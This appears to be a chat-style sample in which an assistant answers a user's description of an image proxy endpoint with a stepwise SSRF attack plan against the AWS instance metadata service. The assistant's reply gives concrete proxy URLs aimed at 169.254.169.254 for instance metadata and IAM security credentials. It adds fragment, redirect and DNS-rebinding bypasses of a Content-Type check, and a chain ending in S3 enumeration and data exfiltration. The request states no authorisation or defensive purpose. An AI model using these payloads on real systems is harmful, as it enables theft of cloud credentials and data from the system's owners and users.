title: SSRF via image proxy → AWS metadata endpoint → IAM credentials
user: The app has an image proxy endpoint: GET /proxy?url=https://example.com/image.png. The server fetches the URL, validates the Content-Type header contains 'image/', and returns the response body. The server runs on EC2 with an attached IAM role. The backend is Python (requests library) without URL parsing validation beyond the Content-Type check.
assistant:
RECON: image proxy endpoint at /proxy?url=... fetches arbitrary URLs. The only validation is Content-Type contains 'image/'. The server is on EC2 (from X-Amzn-Trace-Id header). This is a classic SSRF vector — the proxy can be pointed at internal services.

HYPOTHESIS: SSRF to AWS metadata endpoint (169.254.169.254). The EC2 instance metadata service (IMDS) at http://169.254.169.254/latest/meta-data/ returns instance metadata including IAM role credentials. The Content-Type of the metadata response is text/plain, which does NOT contain 'image/' — but: (1) the Content-Type check might be case-sensitive bypassable, (2) the check might be on the original image URL only, not the redirect, (3) IMDSv1 is accessible without a token if not enforced.

TEST: minimum probe:
1. Try direct: /proxy?url=http://169.254.169.254/latest/meta-data/
2. If blocked by Content-Type check, try with a #fragment: /proxy?url=http://169.254.169.254/latest/meta-data/#.png
3. Try DNS rebinding: point a domain that alternates between a valid image URL and 169.254.169.254
4. Try redirect: host a URL that 302 redirects to http://169.254.169.254/latest/meta-data/ but initially returns Content-Type: image/png
5. If IMDSv1: GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

INDICATOR: the proxy returns AWS metadata (instance-id, security-credentials, etc.) in the response body.

Chainability: SSRF → IMDS → IAM credentials → aws s3 ls → S3 bucket enumeration → data exfiltration.
